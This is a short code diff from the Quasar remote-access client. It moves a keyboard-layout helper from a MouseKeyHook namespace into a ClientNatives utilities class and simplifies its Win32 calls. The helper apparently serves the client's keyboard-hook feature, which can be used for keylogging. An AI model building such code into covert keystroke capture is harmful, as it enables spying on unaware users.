@@ -8,9 +8,9 @@ using System.Windows.Forms;
 using Quasar.Client.MouseKeyHook.Implementation;
 using Quasar.Client.Utilities;
 
-namespace Quasar.Client.MouseKeyHook.WinApi
+namespace Quasar.Client.Utilities
 {
-    internal static partial class KeyboardNativeMethods
+    internal static partial class ClientNatives
     {
         /// <summary>
         ///     Translates a virtual key to its character equivalent using the current keyboard layout without knowing the
@@ -136,9 +136,9 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         /// <returns>HKL</returns>
         private static IntPtr GetActiveKeyboard()
         {
-            var hActiveWnd = ThreadNativeMethods.GetForegroundWindow(); //handle to focused window
+            var hActiveWnd = GetForegroundWindow(); //handle to focused window
             int dwProcessId;
-            var hCurrentWnd = ThreadNativeMethods.GetWindowThreadProcessId(hActiveWnd, out dwProcessId);
+            var hCurrentWnd = GetWindowThreadProcessId(hActiveWnd, out dwProcessId);
             //thread of focused window
             return GetKeyboardLayout(hCurrentWnd); //get the layout identifier for the thread whose window is focused
         }
